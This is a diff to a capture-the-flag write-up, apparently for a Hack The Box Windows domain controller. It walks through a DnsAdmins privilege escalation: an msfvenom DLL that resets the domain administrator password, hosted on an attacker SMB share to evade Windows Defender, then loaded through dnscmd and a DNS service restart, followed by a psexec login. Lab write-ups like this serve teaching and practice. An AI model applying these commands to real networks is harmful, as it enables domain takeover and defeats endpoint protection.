@@ -462,12 +462,66 @@ Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
 
 We can see that the user `ryan` is a member of the group `DnsAdmins`. A search online shows that we can perform a [privilege escalation attack](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise) to SYSTEM by exploiting this group membership. The attack relies on a DLL injection into the dns service running as SYSTEM on the DNS server which most of the time is on a Domain Contoller. For the attack to work, we need to have compromised a user that belongs to a DnsAdmins group on a domain, which `ryan` is a member of.
 
-It is important to note that the problem with generating the DLL with `Msfvenom` is that it crashes the DNS service after it restarts; that’s because the reverse shell created with Msfvenom does not fork as a separate process for the elevated shell. That’s fine for a CTF, but would make for a bad day in a real pentest.
+**N.B.** It is important to note that the problem with generating the DLL with `Msfvenom` is that it crashes the DNS service after it restarts; that’s because the reverse shell created with Msfvenom does not fork as a separate process for the elevated shell. That’s fine for a CTF, but would make for a bad day in a real pentest. To get around this, we can add a function in the DLL that starts an elevated shell in a new thread and keeps the DNS service running. IPPSec and this [article](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise) cover how to do this.
 
-To get around this, we can add a function in the DLL that starts an elevated shell in a new thread and keeps the DNS service running. IPPSec and this [article](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise) cover how to do this.
+Being a member of the `DnsAdmins` group allows us to use the `dnscmd.exe` to specify a plugin DLL that should be loaded by the DNS service. Create a DLL using `msfvenom`, that changes the administrator password.
 
+```bash
+msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > da.dll
+```
 
+Transferring this to the box would likely trigger Windows Defender, so we can use Impacket's `smbserver.py` to start an SMB server and host the dll remotely.
 
+```bash
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share .
+
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+
+The dnscmd utility can be used to set the remote DLL path into the Windows Registry:
+
+```bash
+cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.13\share\da.dll
+```
+
+Next, we need to restart the DNS service in order to load our malicious DLL. DnsAdmins aren't able to restart the DNS service by default, but in seems likely that they would be given permissions to do this, and in this domain this is indeed the case.
+
+```bash
+sc.exe stop dns
+sc.exe start dns
+```
+
+The service restarted successfully, and we saw a connection attempt on our SMB server. We can now attempt to login as administrator using psexec.py with our password.
+
+```bash
+impacket-psexec megabank.local/administrator@10.10.10.169                 
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+Password:
+```
+
+Next, we can get the root flag:
+
+```bash
+C:\Users\Administrator\Desktop> dir
+ Volume in drive C has no label.
+ Volume Serial Number is D1AC-5AF6
+
+ Directory of C:\Users\Administrator\Desktop
+
+12/04/2019  06:18 AM    <DIR>          .
+12/04/2019  06:18 AM    <DIR>          ..
+06/22/2024  04:41 AM                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   2,456,924,160 bytes free
+```
 
 
 
